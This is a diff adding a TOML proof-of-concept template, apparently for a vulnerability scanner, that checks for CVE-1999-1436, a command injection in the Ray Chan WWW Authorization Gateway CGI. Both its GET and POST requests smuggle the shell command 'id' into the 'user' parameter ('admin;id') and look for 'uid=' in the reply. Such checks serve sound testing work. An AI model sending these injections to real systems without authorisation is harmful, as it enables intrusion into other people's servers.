@@ -1,0 +1,57 @@
+[info]
+author = "ave"
+description = "验证 Ray Chan WWW Authorization Gateway 0.1 CGI 程序 user 参数命令注入漏洞"
+id = "POC-AVE-1999-1273"
+name = "CVE-1999-1436 PoC"
+severity = "high"
+tags = ["ave-1999-1273"]
+vuln_id = [
+    "CVE-1999-1436",
+    "AVE-1999-1273",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/auth.cgi?user=admin;id"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/cgi-bin/auth.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "user=admin;id"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+]
